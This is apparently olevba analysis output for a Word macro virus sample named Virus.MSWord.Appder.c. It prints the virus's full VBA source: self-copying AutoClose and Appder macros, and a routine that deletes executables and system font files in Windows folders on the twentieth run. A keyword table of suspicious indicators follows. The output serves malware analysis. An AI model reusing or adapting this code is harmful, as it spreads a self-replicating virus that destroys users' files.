olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Appder.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Appder.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Appder.c - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'   Virus - NTTHNTA

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Quit
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Appder", sTMacro$
sTMacro$ = sMe$ + ":Appder"
WordBasic.MacroCopy "Global:Appder", sTMacro$
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done
Quit:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO InstVer.bas 
in file: ./Virus.MSWord.Appder.c - OLE stream: 'Macros/VBA/InstVer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt version number."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.InstVer.MAIN"
End Sub

Private Function VerNum()
    VerNum = 70
End Function
-------------------------------------------------------------------------------
VBA MACRO Appder.bas 
in file: ./Virus.MSWord.Appder.c - OLE stream: 'Macros/VBA/Appder'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Virus - NTTHNTA

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim AClose
Dim Ad
Dim sMe$
Dim sMacro$
Funyour
On Error GoTo -1: On Error GoTo Quit
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "AutoClose" Then
        AClose = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "Appder" Then
        Ad = -1
    End If
Next i
If Not AClose And Not Ad Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Appder"
    WordBasic.MacroCopy sMacro$, "Global:Appder"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:AutoClose"
End If
Quit:
End Sub

Private Sub Funyour()
Dim WOpen$
Dim sales
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " NTTHNTA", "WINWORD6.INI")
sales = WordBasic.Val(WOpen$) + 1
WordBasic.SetPrivateProfileString "Microsoft Word", "NTTHNTA", Str(sales), "WINWORD6.INI"
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NTTHNTA", "WINWORD6.INI")
If WOpen$ = "20" Then
    WordBasic.SetPrivateProfileString "Microsoft Word", "NTTHNTA", "1", "WINWORD6.INI"
    WordBasic.Kill "C:\DOC\*.EXE"
    WordBasic.Kill "C:\DOC\*.COM"
    WordBasic.Kill "C:\WINDOWS\*.EXE"
    WordBasic.Kill "C:\WINDOWS\SYSTEM\*.TTF"
    WordBasic.Kill "C:\WINDOWS\SYSTEM\*.FOT"
End If
End Sub 'Funyour
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

